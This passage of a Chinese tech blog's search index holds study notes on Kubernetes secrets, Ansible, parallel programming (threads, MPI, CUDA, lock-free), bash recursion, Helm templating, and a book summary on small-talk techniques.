type: NodePort ports: - port: 5432 selector: app: postgres secret as files apiVersion: v1 kind: Secret metadata: name: test-secret type: Opaque data: username: YWRtaW4= password: YTYyZmpiZDM3OTQyZGNz spec: volumes: - name: secret-volume secret: secretName: test-secret containers: - name: test-container image: alpine:latest command: [\u0026#34;sleep\u0026#34;, \u0026#34;9999\u0026#34;] volumeMounts: - name: secret-volume mountPath: /etc/secret-volume 這樣在/etc/secret-volume/username就能直接cat出username\nkubectl exec shell-demo -- cat /etc/secret-volume/username kubectl exec -it my-pod main-app -- /bin/bash\nRef ","permalink":"https://littlebees.github.io/2022/01/k8s%E6%A6%82%E5%BF%B5/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e可以先去看\u003ca href=\"/2020/8/k8s-note/\"\u003ek8s筆記\u003c/a\u003e\u003c/p\u003e","title":"k8s概念"},{"content":"動機 有2種辦法\nyq + trim 有點偏bash流\n- name: Read yaml shell: \u0026#34;cat values.yaml | yq e -o=j \u0026#39;.tag\u0026#39; -\u0026#34; register: tag - name: Parse tag set_fact: tag: \u0026#34;{{ tag.stdout | trim }}\u0026#34; from_yaml - name: Read yaml shell: \u0026#34;cat values.yaml\u0026#34; register: tag - name: Parse tag set_fact: tag: \u0026#34;{{ (tag.stdout | from_yaml)[\u0026#39;tag\u0026#39;] }}\u0026#34; ","permalink":"https://littlebees.github.io/2022/01/%E5%8F%AA%E8%AE%80%E4%B8%80%E9%83%A8%E4%BB%BD%E7%9A%84yaml%E6%88%90ansible%E7%9A%84%E8%AE%8A%E6%95%B8/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e有2種辦法\u003c/p\u003e","title":"只讀一部份的yaml成ansible的變數"},{"content":"動機 平行的思考\nConcurrent computing \u0026amp; Parallel computing \u0026amp; Distributed computing 其實就共用資源、與各個計算單元之間要溝通這件事而言，他們其實差不多\n但如果還是要分的話 Parallelism: 多個core同時跑 Concurrency: 因為同時/交互執行/節點失敗/節點不可靠所造成的效果(non-determinacy)\nParallel computing \u0026amp; Distributed computing 其實就共用資源、與各個計算單元之間要溝通這件事而言，他們其實差不多\n但Distributed computing更重視HA的部分\n平行化就是在 =\u0026gt; Coordination Communication: 傳送結果到其他點 Load Balancing: 工作量不能差太大 Synchronization: 要等其他點到一定程度 用一般演算法的話來說就是D\u0026amp;Q，所以怎麼divide?\nTask-parallelism \u0026amp; Data-parallelism Task-parallelism: 各種任務(像新年大掃除有掃廁所、清廚房\u0026hellip;)，不同core做 Data-parallelism: 不同core做類似的任務，像多段下載\n目前沒有一個好的方式把serial prog轉成Parallel prog 所以要自己寫!!\n因為task吃題目，所以這裡只看Data-parallelism\n2 parallel models (+ 1 model) model的要素\nControl 如何達成平行化 operation之間的怎麼協調執行順序 Data 那些資料是 private 是 shared 怎麼存取shraed data Synchronization 有哪些operation 那些是atomic Cost 有什麼成本 Shared Memory Control 如何達成平行化 thread當成抽象的processor 可以自由地創thread operation之間的怎麼協調執行順序 讀寫shared memory 透過Synchronization做協調(coordinate) Data 那些資料是 private 是 shared private: 在thread內的 shared: 在thread外的 怎麼存取shraed data 直接讀寫mem Synchronization 有哪些operation Synchronization semaphore mutex busy-waiting 協調 condition variable 那些是atomic 就是atomic與thread操作 Cost 有什麼成本 創thread context switch Race Condition 每次跑，結果可能會不同\n優缺點 優點 溝通方式簡單 mem讀寫 缺點 需要Synchronization機制 不好scale 處理cache很頭痛 (cache Coherence) Message passing Control 如何達成平行化 有許多獨立的processor operation之間的怎麼協調執行順序 send/receive pairs 在溝通時剛好完成協調 Data 那些資料是 private 是 shared private: processor內的資料 怎麼存取shraed data 沒有shared data，要透過send/receive pairs Synchronization 有哪些operation 不用 那些是atomic 不用 Cost 有什麼成本 溝通時的delay 溝通的方式: 網路, mem 怎麼接收: poll, interrupt 優缺點 優點 明確溝通 不用特別為cache頭痛 缺點 溝通的成本很高 不好寫 (??) Shared Memory \u0026amp; Message passing communication Turing complete 彼此可以互相實作對方的模型 除了divide，還可以一次處理多一點: Data Parallel 像是array不是一次處理一個，或是讓thread分別處理每個段\n現在是直接處理整個array!!\nParallel Algo的手法 把任務切出來，讓其他人去做 (Divide-and-conquer) 讓一次處理的資料變多 (對array之類的collection操作) Contraction (縮點、上rank) Randomization Identifying independent sets Pointer jumping parallel primitives map reduce: reduce, min, max, sum, \u0026hellip; scan: prefix sum filter 其實是由 map, scan, map構成 map給的predicate scan做prefix sum (counting sort) 利用 第1步與第2步的array去生array 從FP來的，在mapreduce後廣為人知\nParallel Algo的BigO work: sequential 跑的時間複雜度 (只有一顆core) span: 如果有很多core跑時，最長的時間複雜度 (有很多顆core) 怎麼樣叫Parallel，怎麼樣叫Sequential fully Sequential: for (i : range(A)) A[i] = f(A[i-1]) 這個span是A fully Parallel: for (i : range(A)) A[i] = f(A[i]) 這個span是1 partially Parallel: for (i : range(A)) A[i] = f(A[i-sqrt(len(A))]) 這個span是sqrt(A) speed-up: work/span 所以實際的時間複雜度 (Tp)，一定介於兩者之間 work \u0026lt;= Tp \u0026lt;= span\n之後有個神奇公式，可以求漸近的Tp，P是核心數， Tp = O(work/P + span)\n這邊可以配合後面的 測量指標(尤其是Amdahl’s Law) 一起看\n例子: findMin on Tree def findMin(root): if not root: return float(\u0026#39;-inf\u0026#39;) else: return min(root.data, findMin(root.left), findMin(root.right)) work:\nif n = 1 O(1) else O(left) + O(right) + O(1) span:\nif n = 1 O(1) else max(O(left) + O(right)) + O(1) 所以需要知道實際的input，才知道實際的複雜度\nDegenerate Tree(就是list) work: O(n) span: O(n) Perfect Tree(平衡樹) work: O(n) span: O(log n) 測量指標 speedup: serial執行的時間對上Parallel執行的時間 的比率 線性speedup speedup 剛好等於 核心數 也就是隨著核心數上去速度就會上去 efficiency: speedup的比率除上核心數，也就是每個核心促進了多少進步 scalability: 資料量上升，核心數上升就能讓efficiency不變 Strongly scalable 核心數上升，資料量不變，efficiency不變 Weakly scalable 核心數上升，資料量上升，efficiency不變 隨著核心數上升，performance可以提升到多少? performance有兩個面向，latency與throughput\ns是serial的比例(就是1-p)，p是parallel的比例(就是1-s)，n是核心數\n兩個面向關注的點不同，\n一個是關注能減少多少時間 Amdahl’s Law speedup = (s+p) / (s+(p/n)) = 1 / (s+(p/n)) n帶無限，可以得到1/s 假設 溝通時沒有成本 問題大小固定 一個看能多處理多少工作 Gustafson’s Law (s+n*p) / (s+p) = (1-p)+n*np = 1+(n-1)*p 假設 處理時間固定 到處都是平行化 processor Instruction Level Parallelism (ILP) 讓一次處理的資料變多 指令 (把指令想像成一條長帶子) 把帶子空隙填滿: 總throughput不變，latency變小 Out of Order Execution stall時跑指令 Out-of-order execution =\u0026gt; out-of-order completion Pipelining 把工作流程分段 各種harzard Structural hazards: 同時想用同一個phase Data hazards Read-after-write: 完成寫入前讀值 沒辦法在不犧牲latency的方式下處理 處理方式 stall Write-after-read: 完成讀值前寫入 Write-after-write: 完成第一個寫入前寫入 處理方式 ooo execution register renaming forwarding (cps) Control hazards 猜、猜、猜 Speculative Execution 猜 分支、指令相依性、數字 猜錯要整個重來 把帶子疊到帶子上(1 x n到2 x 0.5n): 總throughput變大，latency變小 Superscalar: 可以同時跑很多指令 原本是scalar，也就是只操作一條指令/資料單位 VLIW (Very Long Instruction Word): 把沒有相關的指令包在一起跑 由compiler指定什麼指令可以一起跑 資料 Vector Processing/SIMD (Single Instruction Multiple Data) 以array為單位去操作了 (原本是一次一個，做好幾次) programmer要自己寫，compiler或是cpu不會自己轉換 Multimedia Extensions 把一部分的reg當成array 像把32 bits的reg當成兩個16 bits的array Superscalar \u0026amp; VLIW 與Superscalar差在compiler的輸出，一個是parralel，一個是serial code 所以VLIW compiler需要做binder把call分配到下面的執行單元，Superscalar是留給硬體 Thread-Level Parallelism (TLP) thread origin real processor Hardware illusion: 在某個時間後就切到另一個thread Hardware OS user-level (PL的library) thread creation cobegin/coend: 這塊(procedure)可以平行的跑 fork/join: fork出去的(procedure或function)會平行的跑 future: 這段code(expression)會平行的跑 thread Scheduling 底層決定他什麼時候跑 (thread switch) fine grain: thread主動交棒 coarse grain: thread stall, 其他thread可以跑 等等 可以指定affinity 或是用user-level thread too many thread! 創thread要$$ mem cpu的cycle Sol thread pool或是固定thread數量 復用main thread before: A.fork(); B.fork(); A.join(); B.join(); after: A.fork(); B.run(); A.join(); TLP + ILP 把TLP的thread當成填充ILP發生stall的指令來源\nsummary Memory System 與cpu相比，ram的速度太慢了!! Locality 8/2法則: 最常用到的只有一點點 從古至今，hardware依舊靠locality加速 Temporal Locality (Locality in Time) loop Spatial Locality (Locality in Space) array Memory Hierarchy 越慢的放越遠 hardware Architecture 把多個處理單元放在一起，一起處理問題\n重點是? 資源分配 有什麼處理單元? cpu? gpu? 多少mem communication的成本 Data access, Communication and Synchronization 從Power與latency (所有效能面向)，communication是最貴的部分 Architecture的分類 Single-instruction single-data (SISD) Single-instruction multiple-data (SIMD) Multiple-instruction multiple-data (MIMD) Multiple-instruction single-data (MISD) 總的來說 Shared-memory Architectures 任何cpu都能access到任何mem 透過mem操作溝通 兩種類型 Uniform Memory Access\nSymmetric Multiprocessor (SMP) Cache Coherence 每個cpu都有自己的cache 如果有人改到mem的值，其他cache怎麼辦 Sol: Coherence Protocol 去invalidate其他cache Non-Uniform Memory Access\nDistributed shared memory 所以access到mem的時間會有所不同!! Coherence not Enough!! 傳輸有delay的話\u0026hellip; Sol: Memory Consistency Model 執行某個記憶體操作，誰看的到這個改動 Sequential Consistency 每個指令都是atomic!! 還有其他的，在介紹lockfree時再提 Coherence \u0026amp; Consistency Coherence read會拿到什麼值 別人寫了，(cache)拿到的值是不是對的 behavior to same location Consistency 什麼時候會拿到寫入的值 寫之後，要一直read到某一次或是第一次之後才會看到 behavior to other locations Distributed-memory Architectures processor有自己的mem mem不與其他人共享 software Programming Shared-Memory Model 變數(mem)分成shared與private Explicit v.s. Implicit Threads Programming Explicit: pthread 創thread 用API創 programmer創thread與管理thread 分配工作 programmer自己寫 sync (等待thread完成) 手動join Implicit: openMP 創thread 用directives runtime創thread與管理thread 分配工作 用directives sync (等待thread完成) 在區塊結束的地方等 Nondeterminism: race condition mutex busy-waiting semaphore Transactional memory Thread Safety serial function在multi-thread能不能正常跑 反例: strtok 他有static去存目前string處理到哪邊，如果被多thread call\u0026hellip; Distributed-Memory Model process有自己的mem mem不與其他人共享 各個process之間有rank作類似addr的功用 有另外的超能力 Broadcast: 把val推到其他process Reduction: 把其他process的output整合 One-Sided Communication 只更新一個mem的值 跟新local，from remote process 跟新remote，from local process Programming Hybrid Systems Partitioned Global Address Space Languages allow the user to use some shared-memory techniques for programming distributed-memory hardware 跨local的mem access十分慢!! Shared memory programing 3 synchronization scenarios critical section 多thread共同修改某一變數，就是critical section\nBusy-waiting 可能是reorder的受害者 y = f(id) while (flag != id) ; x += y flag++ // order y = f(id) x += y while (flag != id) ; flag++ 會把一顆cpu吃掉 (spin lock) mutex 就是mutex，在real time可以有priority promotion處理priority inversion\nSemaphore acc就是還有多少個空位的意思\n原本: acc + queue posix: acc\nSemaphores vs Mutexes Semaphore不管ownership，只要有人call semaphore，semaphore就會變\nProducer-Consumer Synchronization (no critical section) 沒有critical section No competition synchronization 為了合作而synchronization (Cooperation synchronization) barrier 要所有thread在同一時間啟動(或是停在同一個點)\n像是debug或是計時會用到\n用busy-waiting與mutex mutex.lock() acc += 1 mutex.unlock() while acc \u0026lt; cnt_of_threads: pass 吃爆cpu(busy waiting) 怎麼做第2個barrier? reset acc? 要考慮有沒有reset acc對 用Semaphores 一個數有幾個process (count_sem, 1) (其實應該可以用atomic)\n一個數負責停下process (barrier_sem, 0)\nsem_wait(\u0026amp;count_sem); if (counter == thread_count−1) { counter = 0; sem_post(\u0026amp;count_sem); for (j = 0; j \u0026lt; thread_count−1; j++) sem_post(\u0026amp;barrier_sem); } else { counter++; sem_post(\u0026amp;count_sem); sem_wait(\u0026amp;barrier_sem); } 用condition variable pthread_mutex_lock(\u0026amp;mutex); counter++; if (counter == thread_count) { counter = 0; pthread_cond_broadcast(\u0026amp;cond_var); } else { pthread_cond_wait(\u0026amp;cond_var, \u0026amp;mutex) ; } pthread_mutex_unlock(\u0026amp;mutex); lock其實很貴 假設要做一個multi-thread的linked list\n所有動作用lock包 那根本就是serial 每個node放lock lock要空間!! 實作十分複雜 明明只要read卻還要跟別人搶lock!? 所以這個效能是所有case中最爛的 read-write lock 可以與1一樣但是read的成本變小了 write多，總體效果與1一樣 read多，效果比1好 還可以保護write 關於cache cache miss void *Pth_mat_vect(void* rank) { ... for (i = my_first_row; i \u0026lt;= my_last_row; i++) { y[i] = 0.0; // HERE for (j = 0; j \u0026lt; n; j++) y[i] += A[i*n+j]*x[j]; // HERE } return NULL; } /* Pth_mat_vect */ cacheline是64 bytes\n如果y的範圍太大，寫入會失敗 (write-misses) 如果x的範圍太大，寫入會失敗 (read-misses) false sharing 假設上面程式的y，剛好可以都放入cacheline，但是只要cacheline的值被某個thread改變，其他thread要access資料時cacheline就要重拿資料(Cache Coherence)，而這邊明明都是y，如果一直有thread寫資料\u0026hellip;\n所以可以想見，cacheline會一直重拿，但是明明大部分的cache(y)是對的!!\n另一個情況是task上編號(rank)，這樣在shared mem中就不會衝突，但因為false sharing就算把thread加上去，效能也沒有隨之變好\n加padding把cacheline塞滿 sum[id][pad] 用syncronization包成一個變數!! atomic_int sum Reordering Memory 再一次，memory consistency model sequentially consistent program order == code order == commit order Relaxed Consistency 把指令分成 data(write, read) 不保證順序 sync (mem barrier, volatile, atomic, fork/join\u0026hellip;) 保證順序!! S -\u0026gt; S S -\u0026gt; W/R W/R -\u0026gt; S mem barrier (在openMP叫flush) flush之前的變數(在flush有用到的部分)會被commit (所以flush中一定看的到) read mem barrier flush之後的變數(在flush有用到的部分)，會看到在flush中做出的結果 write mem barrier flush中不會reorder 單論Synchronization 我們的敵人 race condition: 泛指跑好幾次可能出現不同的結果 data race: 對同一個變數修改 reorder (講義叫Bad interleavings) a = 1; b = 2 與 b = 2; a = 1; 在compiler或是cpu眼中是可以reorder的!! 看arch的規定 工具 保持Atomicity (critical section) mutex，但有很多細節 新的敵人 deadlock Dining Philosophers (為lock上順序!!) Time-Of-Check-To-Time-Of-Use if (checkA()) { execA(); } 有人在checkA成功後，到執行execA之前，被其他thread做到事的話\u0026hellip; 換言之，if的block中，不能信任有確認過的條件了 解法 Thread-Local Memory 不用share的資料就copy Immutable Memory 沒有write，沒有race condition或是data race 但我真的需要改 (要用mutex了qq) Use Consistent Locking 用同樣的lock到所有有關的地方 好好記錄為什麼需要這個lock 用lock去割出 shared-and-mutable locations lock-oriented Start With Fewer Locks (Coarse-Grained) 除非contention太嚴重才讓lock變多 (Fine-Grained) Keep Critical Sections Small Critical Sections太長: 效能差 Critical Sections太短: race condition (可以看到中間狀態) Think About Atomicity 想想什麼動作應該放在一起 像Time-Of-Check-To-Time-Of-Use 不是data race也不是race condition 但就是出事，所以應該把if與動作綁在一起 Use Libraries Message passing programing Point to Point Communication Communication透過recv與send執行\nmessage會傳\nsender的rank receiver的rank communicator (MPI的網路) tag: 使用者指定的tag data 下面是standard 的傳送方式 sender buf --{copy}--\u0026gt; system buffer --{network}--\u0026gt; system buffer --{copy}--\u0026gt; receiver buf\ncommunication modes blocking blocking的理由是\n等handshake\nSynchronous 等copy\n所有類型都要等 從sender buffer 到 receiver buffer Synchronous Ready 從sender buffer 到 對面的system buffer 到 receiver buffer Standard(資料小) 從sender buffer 到 自己指定的 buffer 到 receiver buffer Buffered 沒copy到別的buffer (sender buf =\u0026gt; receiver buf)\nSynchronous: 一般的tcp ssend送msg到recv說我要傳，之後等 recv送msg，之後等 handshake好了，可以送了，兩邊等到完成 Ready: 類似reverse tunnel recv送msg，之後等 rsend看有沒有recv的msg，有，開送，兩邊等到完成；沒有，報錯退出 copy到別的buffer\nBuffered: 先copy到自己指定的mem (in sender) bsend把資料copy到自己指定的mem，copy完退出 收到recv的msg，開送 Standard: 資料小: copy到system buffer (in receiver) send把資料送到對面的system buffer，等到送完 recv直接從system buffer copy到receiver buf，等到copy完 資料大: 就變成Synchronous non-blocking isend會開始送，但是不會等，馬上return 用test看目前狀態，wait去等他完成 irecv如果好了就會收，但是不會等，馬上return 用test看目前狀態，wait去等他完成 剩下就是Standard(資料小)\n可以想像成傳資料時開thread!!\ndeadlock (對，還是有) send 與 recv 要成對出現\nif (rank == 0) { err = MPI_Send(sendbuf, count, datatype, 1, tag, comm); err = MPI_Recv(recvbuf, count, datatype, 1, tag, comm, \u0026amp;status); }else { err = MPI_Send(sendbuf, count, datatype, 0, tag, comm); err = MPI_Recv(recvbuf, count, datatype, 0, tag, comm, \u0026amp;status); } 解法: swap if (rank == 0) { err = MPI_Send(sendbuf, count, datatype, 1, tag, comm); err = MPI_Recv(recvbuf, count, datatype, 1, tag, comm, \u0026amp;status); }else { err = MPI_Recv(recvbuf, count, datatype, 0, tag, comm, \u0026amp;status); err = MPI_Send(sendbuf, count, datatype, 0, tag, comm); } 解法: non-blocking if (rank == 0) { err = MPI_Isend(sendbuf, count, datatype, 1, tag, comm, \u0026amp;req); err = MPI_Irecv(recvbuf, count, datatype, 1, tag, comm); err = MPI_Wait(req, \u0026amp;status); }else { err = MPI_Isend(sendbuf, count, datatype, 0, tag, comm, \u0026amp;req); err = MPI_Irecv(recvbuf, count, datatype, 0, tag, comm); err = MPI_Wait(req, \u0026amp;status); } CUDA cpu vs gpu cpu: Latency\n大cache 降低mem延遲 複雜的control邏輯 branch prediction data forwarding 計算能力(ALU)強 降低operation延遲 在sequential code快 gpu: Throughput\n小cache 增加mem的throughput 簡易的control邏輯 NO branch prediction NO data forwarding 計算能力(ALU)弱(省能源) 延遲高，但是可以pipeline達成高throughput 所以有很多thread 在parallel code快 gpu 下面是gpu在arch上的特點 CUDA: Parallel Computing Platform CUDA: Heterogeneous Programming gpu叫device 控制的cpu叫host 各自有自己的mem，而跑在device上的function(thread)叫kernel Thread Hierarchies grid有很多block，block(wrap)有很多thread，block中的thread可以共享資料，也同時啟動(迴避掉sync的問題)，跑同一個指令\n不同block的thread不能合作，同時以wrap為單位做schedule\nAt any time, only one of the warps is executed by SM\nThread Synchronization 可以用 __syncthreads創barrier atomic Memory Model lockfree 無論當前處於什麼狀態，只要運行足夠長的時間，至少有一個 process 能取得進展或完成其操作 像是Real-time的狀況，有mutex就有可能發生priority inversion\n或是說，絕對不可能會有deadlock程式，也就是沒有lock的程式\n作法 如果不能lock，就只能busy-waiting(或是cpu有特別指令)\n做test-and-set，fetch-and-add，compare-and-swap，來確認改之前與改之後的值一不一樣，一樣就寫，不一樣繼續等\n少了lock之後 lock有一個很重要的性質，他是memory model的sync指令，所以不會被reorder\n但現在不能用lock，所以要注意兩個東西\ncpu的memory model 不同架構的cpu在不同case會做reorder的case不一樣 Weak vs. Strong Memory Models 怎麼下memory barrier (Acquire and Release Semantics) 得自己把不能reorder的範圍畫出來 Acquire and Release Semantics 有些programming language有提供memory model!! 可以不用直接調用memory barrier，改用volatile 謝謝JAVA 我之前的記憶體模型筆記 The Happens-Before Relation The Synchronizes-With Relation ABA問題 前面是看值一樣就當成沒改，但這是把資料與時間兩件式混在一起，所以有了ABA，也就是看起來沒換，但其實被人換過，只是資料剛好長的一樣\n所以要多一個變數紀錄時間，有改就要遞增；與read-write lock一樣\nwait-free 就前面看到的，lockfree可能讓process無限的等(飢餓)，但是wait-free可以在有限的次數讓process動 但超難，pass\nWait-Free Queues With Multiple Enqueuers and Dequeuers\nTODO wait-free Algorithms Sequential \u0026amp; Parallel: A Unified Approach 這我不確定，但是因為他比較新就放這裡 An introduction to parallel algorithms (jaja) 這裡面提到 Parallel Algo的手法 中提到的與沒有提到的手法 Ref An Introduction to Parallel Programming, Morgan Kaufmann Parallel Thinking Analysis of Parallel Programs More Parallel Primitives and Parallel Sorting Synchronization Some Sequential Algorithms are Almost Always Parallel An Introduction to Lock-Free Programming\n","permalink":"https://littlebees.github.io/2022/01/parallel-thinking/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e平行的思考\u003c/p\u003e","title":"Parallel Thinking"},{"content":"動機 bash可以寫rucursive!!\ncode 下面除了遞迴外，還有用到bash function不用寫args list的特性，去塞acc\ncharset=\u0026#34;0 1\u0026#34;; ret=\u0026#34;\u0026#34; function perm() { [ \u0026#34;$1\u0026#34; = \u0026#34;0\u0026#34; ] \u0026amp;\u0026amp; { f $2; return; } for char in $charset do perm \u0026#34;$((${1} - 1 ))\u0026#34; \u0026#34;$char $2\u0026#34; done } perm 4 ","permalink":"https://littlebees.github.io/2022/01/%E5%9C%A8bash%E4%B8%AD%E5%AF%ABrucursive/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003ebash可以寫rucursive!!\u003c/p\u003e","title":"在bash中寫rucursive"},{"content":"動機 文件寫得不錯，很好懂\n大概過程 template被compile成yaml，之後就kubectl apply -f\n結構 templates就是yaml的template value.yml就是放各種資料，用\n{{ .parent.item }} 拿 Chart.yml這個helm的訊息 Charts管其他dependencies from 其他chart\n語法 取值 {{ .Values.\u0026lt;item\u0026gt; }} .就是root，後面就是很像物件調用方法，至於有什麼物件看這裡\n變數 {{- $relname := .Release.Name -}} {{- range $key, $val := .Values.favorite }} pipeline {{ f a }} // 變成 {{ a | f }} 消滅空行 {{ if eq .Values.favorite.drink \u0026#34;coffee\u0026#34; }} mug: \u0026#34;true\u0026#34; {{ end }} 會輸出\nmug: \u0026#34;true\u0026#34; 不是不行，但能不能把if的空行消滅掉\n{{- if eq .Values.favorite.drink \u0026#34;coffee\u0026#34; }} mug: \u0026#34;true\u0026#34; {{- end }} 會輸出\nmug: \u0026#34;true\u0026#34; 不要在block中縮排 {{- if .... }} xyz: 123 {{- end }} {{- if .... }} abc: 123 {{- end }} 變成\nxyz: 123 abc: 123 chroot 原本\ndrink: {{ .Values.favorite.drink | default \u0026#34;tea\u0026#34; | quote }} food: {{ .Values.favorite.food | upper | quote }} release: {{ .Values.favorite.Release.Name }} 變成\n用$來拿到with外面的root (話是說上一層)\n{{- with .Values.favorite }} drink: {{ .drink | default \u0026#34;tea\u0026#34; | quote }} food: {{ .food | upper | quote }} release: {{ $.Release.Name }} {{- end }} loop {{- range .Values.pizzaToppings }} - {{ . | title | quote }} {{- end }} 抽象yaml {{- define \u0026#34;mychart.labels\u0026#34; }} labels: generator: helm date: {{ now | htmlDate }} {{- end }} metadata: name: {{ .Release.Name }}-configmap {{- template \u0026#34;mychart.labels\u0026#34; . }} // 要記得把想要root傳進去 變成\nmetadata: name: {{ .Release.Name }}-configmap labels: generator: helm date: {{ now | htmlDate }} 用include可以控制縮排 {{- define \u0026#34;mychart.labels\u0026#34; }} labels: generator: helm date: {{ now | htmlDate }} {{- end }} metadata: name: {{ .Release.Name }}-configmap {{- include \u0026#34;mychart.labels\u0026#34; | indent 4 }} 變成\nmetadata: name: {{ .Release.Name }}-configmap labels: generator: helm date: {{ now | htmlDate }} local install helm pull \u0026lt;repo\u0026gt;/\u0026lt;name\u0026gt;會拉tar回來，name-ver.tar\nhelm可以install by\ntar folder 但要指定完整檔名，所以如果都拉最新版，tar的ver會無法確認 所以要先untar，他untar後只會有名字 helm pull \u0026lt;repo\u0026gt;/\u0026lt;name\u0026gt; --untar 之後就可以直接指定folder name安裝\nHow to debug 把生了什麼印出來\nhelm install --dry-run --disable-openapi-validation \u0026lt;name\u0026gt; ./mychart helm template . API 能用的函數在Go template language與Sprig template library\n其他有用的 YAML Techniques Debugging Templates Chart Hooks\n","permalink":"https://littlebees.github.io/2022/01/helm-tutorial/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e文件寫得不錯，很好懂\u003c/p\u003e","title":"helm tutorial"},{"content":"動機 書越來越貴了\n閒聊目的: 建立人際關係\n透過對話，卸下彼此的心防，讓雙方關係變得更緊密 不需要 硬講一些有趣的事 結論、結局 資訊交流是難以拉近彼此距離的閒聊 沒有終點反而更好 重點不是內容 傳遞心情、感受 很順手、適合自己、麻煩的地方、有趣之處、玩上癮、我懂 有夠嚇人、整個變得不一樣 而是你來我往的【持久性】 持續不中斷 \u0026lt;=\u0026gt; 閒聊 對話是雙向的 如何開啟話題\n用流行話題或是新聞開頭 對話會變得很表面、膚淺 很難聊到彼此感受 聊與自己有關的事件經驗 使用狀聲詞或語助詞，有助於表達自己的真實感受 經驗+感受 =\u0026gt; 快速拉近你與對方的距離 如何傾聽\n【不要求對話要有結論或是結果】 不要提供建議 讓對話持續不中斷 不糾正對方的錯誤 讓對方表達自己的心情 肯定同理對方就好 有效果的反應 傾聽，只要有所反應就好 用身體語言、表情傳遞心情 拍手、微笑、換表情 沉默怎麼處理\n先放緩步調，不用怕沉默 利用前面的原則，聊自己的事、貼近自己的事，聊心情 結束閒聊的方法\n做出與前面的原則相反的行為 盡量不聊心情、想法 減少反應 做出結論 最後道謝，離開 開始閒聊\n從打招呼開始 你好、午安等 打招呼後報上自己的名字 不論第幾次見面 這樣對方也會報名字，可以確認對方的姓名 知道、問了名字之後 問名字的由來 不要聊同名的朋友!! 詢問興趣的方式 【你最近有迷上什麼嗎?】 問題具體 不用擔心對興趣的定義差異 如果被問了，你有什麼興趣怎麼辦 不用回答真正的興趣 說 最近迷上的事 周末做了什麼 這禮拜的行程 閒聊時不用正面回答別人的問題 聊共同朋友? 最好不要 很難聊到彼此的事 要把話題帶回彼此身上 找對話中的keyword 挑話題 有沒有共同點(共同話題)一點也不重要 不是只有共同興趣能聊 就算是不熟的topic，也有機會 問對方的 過去 【從以前就很喜歡嗎】、【從什麼時候開始學的】 很好作為開頭問題 現在 【現在也很常做嗎】、【最近有什麼推薦的】 縮短彼此的心理距離 未來 【這個周末也是嗎】、【下次有想參加的活動嗎】 可以銜接到下一個話題 有共同話題 用 問對方的 過去、現在、未來，讓對方先講 我也是 + 然後呢?然後呢? 說到喜歡的事時 (我喜歡\u0026hellip;, 我試了\u0026hellip;) 閒聊時應該說 沒有理由的喜好 而非 主張強烈的意見 提問、贊同、自我揭露 飲食喜好是不錯的話題 遇到喜歡爭論的人 表示感謝馬上離開 自我揭露 不能只讓別人說!! 稍微講講自己，之後馬上把話題轉回去 【我常常這樣\u0026hellip;，你會嗎?】 【我最近覺得\u0026hellip;，你覺得?】 對方停不下來 冷卻話題 正面回顧前面的對話 【你說的東西很有趣時間過得好快啊】 【講得好多，聊得真是開心】 看對面要不要把球丟回來 或 直接道謝之後離開 肢體動作 不要雙手抱胸 邊說邊做誇張的手勢 想要眼神交會 =\u0026gt; 看對方的嘴角說話 想要離開可以做與上面相反的動作 應聲附和 應聲附和比讚美追捧簡單 複述關鍵字 附和、點頭 (不要怕沉默，只要有在那個ctx下讓雙方都可以閒聊就ok) 再極端點，可以說【我可以做筆記嗎】 利用 對阿、不錯ㄟ、恩恩、咦、喔喔 等語助詞和感嘆句 麻煩的話題 (說教、尷尬\u0026hellip;) 不要反駁 把球丟給別人 【XXX，你覺得如何】 可以把路人拉入對話 增加夥伴，避免最糟的狀況 用【謝謝】強制結束對話 閒聊不需要開朗活潑，而是技巧 一切就是習慣就好，要順著開口 順著上一句、環境、ctx，開始問 別人找你商量煩惱 不要給意見!! 不燃馬上就結束了 反正他也只是想抒發 展現同理(贊同) 這個話題也許很無聊、沒有好的結論 只要先和對方提 【我想說的一點結論都沒有，ok嗎】 【很芝麻小事的話題】 不會給對方過度期待 讓閒聊有畫面 避免指示代名詞 上名字、代號 重點是好懂: 具體、有畫面 容易回答的問題 【你做了什麼特別的事】 詢問對方熱中的事物、講究之處 用 過去/現在/未來 問/回答 興趣 用 習慣 問/回答 堅持 如何(how)? 詢問心情 不要問為什麼，讓人思考情緒就會冷靜下來 例:不小心睡過頭了 【一次也沒有醒嗎】 【你醒來時是不是嚇到了】 說話方式 描述氣氛 不能含糊回答的不能當成閒聊的話題 如果涉及判斷，就回答好的(含糊回答) 不論是不是好的 順應ctx感受氣氛 如果聽到不懂得名詞，就附和就好 重點是分享/感受當時的心情 讚美、附和 不要吐槽，一旦尷尬就完了 例子 好酷 不錯ㄟ 好美 \u0026hellip; 提具體問題 問對方好回答的問題!! 提具體問題 你最近好嗎 =\u0026gt; 工作順利嗎 抽象 + 具體 你最近好嗎 + 你現在公司是在丸之內嗎 你周末做了什麼 + 例如上個周末 好久不見，最近好嗎 + 身體都還好嗎 面對讚美 接受，並道謝，之後加一句擴展話題 謝謝 + 我每天晚上都擦超級保濕的乳霜 如何讚美 點出變化 + 讚美 你是不是換髮型了 + 很適合你ㄟ 話題延伸不下去了 回到前面的話題、重複的話題也ok 聊自己的經驗 只要還在閒聊的ctx，不管什麼話題都可以拋 【這個我之前是不是講過了】 【你可以再說一次】、【我忘了，你再說一次】 不要用模糊的記憶介紹他人 【我記得是負責XXX?】 直接把這件事轉給被介紹的人 被問到隱私問題時 面對難以回答的問題時 用一般論含糊帶過 想與對方拉近距離 老實回答 商場上的說法方式 如同師徒的請益對話 只要有微妙的上下關係都適用 切入話題的方法 不一定要知道的多，或是十分深入 要有自己的切入點 想切入正題 直接講明，【我們換個話題\u0026hellip;】 只要不追求順其自然，閒聊其實超簡單 別碰熟人的八卦 名人或是不認識的就算了 表達感謝 除了感謝外，還可以加上關心(善意) 謝謝今天陪我 回程路上冷不冷 電車上好像很擠，順利到家了嗎 ","permalink":"https://littlebees.github.io/2022/01/%E6%9C%80%E9%AB%98%E9%96%92%E8%81%8A%E6%B3%95/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e書越來越貴了\u003c/p\u003e","title":"最高閒聊法"},{"content":"動機 The idea is 